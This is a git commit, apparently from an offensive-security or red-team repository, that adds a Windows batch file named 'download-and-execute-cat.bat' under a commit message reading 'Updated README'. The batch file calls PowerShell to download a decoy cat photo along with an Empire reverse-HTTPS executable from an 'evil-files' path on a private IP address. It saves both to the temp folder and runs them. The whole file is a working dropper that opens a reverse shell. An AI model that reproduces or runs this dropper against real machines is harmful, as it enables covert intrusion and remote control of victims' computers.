5f31bdd9c891b9823f88a59943768a8d0f9c871c
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-07-12 20:51:56 +0200

    Updated README

---
+++ deliver/download-and-execute-cat.bat
@@ -0,0 +1,8 @@
+@echo off
+
+set files='https://www.rd.com/wp-content/uploads/2021/03/GettyImages-140594401-1-scaled.jpg','https://192.168.122.108/evil-files/empire_reverse_https_8080.exe'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+
+
